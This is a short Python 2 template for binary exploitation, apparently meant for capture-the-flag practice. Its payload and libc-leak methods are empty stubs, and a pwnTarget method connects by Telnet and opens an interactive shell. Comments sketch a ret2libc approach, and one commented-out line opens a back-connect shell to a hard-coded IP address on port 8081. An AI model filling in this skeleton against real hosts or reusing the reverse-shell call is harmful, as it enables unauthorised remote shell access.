#!/usr/bin/python

from Pwning import *
# customs when binary doesn't have nx eable or mprotect/nmap is on got table
# from Shellcode import *

# edit Templet with your own Name
class Templet(Payload):
	def __init__(self):
		Payload.__init__(self)
		self.host[1] = '' # my Target host
		self.port = 0x00 # my Target port
		self.mode = 0 # x86 target platform
		# self.mode = 1 x86_64 target platform	

	# building my Payload
	def buildPayload(self):
		pass
		
	# other method goes here
	def leakLibcSystemAddr(self):
		pass

	# ok i go to pwn it :D
	def pwnTarget(self):
		# shell.backconnectShell('192.241.177.173',8081)
		conn = Telnet(self.host[0],self.port)
		# ..... snip .....
		# when i exploit a bin with NX was enabled
		# print '[+] leak_func() :',hex(leak_func_addr)
		# print '[+] system() :',hex(system_addr)
		# print "[+] '/bin/sh' :",hex(bin_sh_addr)
		# ...... snip ......
		print '[+] Pwned Shell.'
		conn.interact() # pwn the shell

templet = Templet()
templet.pwnTarget()